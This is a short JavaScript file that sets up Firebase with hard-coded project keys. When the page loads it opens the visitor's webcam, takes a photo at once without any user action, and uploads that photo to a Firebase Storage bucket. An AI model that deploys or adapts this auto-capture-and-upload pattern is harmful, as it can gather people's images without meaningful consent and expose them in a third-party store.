// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();

// Access the camera and start the video stream
async function startVideo() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        // Capture the photo immediately after the video starts streaming
        video.onloadedmetadata = function() {
            capturePhoto();
        };
    } catch (error) {
        console.error('Error accessing camera:', error);
        document.getElementById('message').textContent = 'Camera permission denied or an error occurred.';
    }
}

// Capture the photo and upload it to Firebase Storage
function capturePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Set the canvas size to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the video frame to the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Convert the canvas image to a Blob
    canvas.toBlob(async function(blob) {
        // Generate a unique file name using a timestamp
        const fileName = `photo_${Date.now()}.png`;

        // Create a reference to Firebase Storage using the unique file name
        const storageRef = storage.ref(`users/${fileName}`);

        try {
            // Upload the image to Firebase Storage
            await storageRef.put(blob);
            alert(`Photo uploaded to Firebase successfully as ${fileName}!`);
        } catch (error) {
            console.error('Error uploading to Firebase:', error);
            alert('Failed to upload photo.');
        }
    });
}

// Start the video stream when the page loads
window.onload = startVideo;
